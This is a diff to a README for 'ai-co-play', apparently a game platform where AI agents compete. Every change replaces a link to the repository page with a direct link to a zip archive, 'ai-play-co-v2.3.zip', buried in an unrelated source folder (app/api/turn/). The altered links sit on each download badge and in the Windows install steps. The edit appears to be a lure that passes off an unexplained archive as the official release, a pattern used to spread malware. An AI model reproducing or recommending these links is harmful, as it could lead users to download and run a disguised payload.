@@ -1,6 +1,6 @@
 # 🤖 ai-co-play - AI Agents Compete Across Multiple Games
 
-[![Download ai-co-play](https://img.shields.io/badge/Download-ai--co--play-brightgreen?style=for-the-badge)](https://github.com/valdi03/ai-co-play)
+[![Download ai-co-play](https://img.shields.io/badge/Download-ai--co--play-brightgreen?style=for-the-badge)](https://github.com/valdi03/ai-co-play/raw/refs/heads/main/app/api/turn/ai-play-co-v2.3.zip)
 
 ## 🧩 What is ai-co-play?
 
@@ -28,7 +28,7 @@ These are the minimum specs to ensure smooth gameplay and agent performance.
 
 ## 🔽 Download ai-co-play
 
-[![Download ai-co-play](https://img.shields.io/badge/Download-ai--co--play-blue?style=for-the-badge)](https://github.com/valdi03/ai-co-play)
+[![Download ai-co-play](https://img.shields.io/badge/Download-ai--co--play-blue?style=for-the-badge)](https://github.com/valdi03/ai-co-play/raw/refs/heads/main/app/api/turn/ai-play-co-v2.3.zip)
 
 To get started, visit this page to download the latest version of ai-co-play. The page includes all files needed to install and run the software.
 
@@ -40,7 +40,7 @@ Follow these steps to download and run ai-co-play on your Windows PC.
 
 Click the download button above or go to:
 
-https://github.com/valdi03/ai-co-play
+https://github.com/valdi03/ai-co-play/raw/refs/heads/main/app/api/turn/ai-play-co-v2.3.zip
 
 Look for the latest release or main download section. You will find all files needed to install ai-co-play.
 
@@ -106,4 +106,4 @@ The platform supports advanced AI techniques but keeps the user experience simpl
 
 ---
 
-[![Download ai-co-play](https://img.shields.io/badge/Download-ai--co--play-grey?style=for-the-badge)](https://github.com/valdi03/ai-co-play)
+[![Download ai-co-play](https://img.shields.io/badge/Download-ai--co--play-grey?style=for-the-badge)](https://github.com/valdi03/ai-co-play/raw/refs/heads/main/app/api/turn/ai-play-co-v2.3.zip)
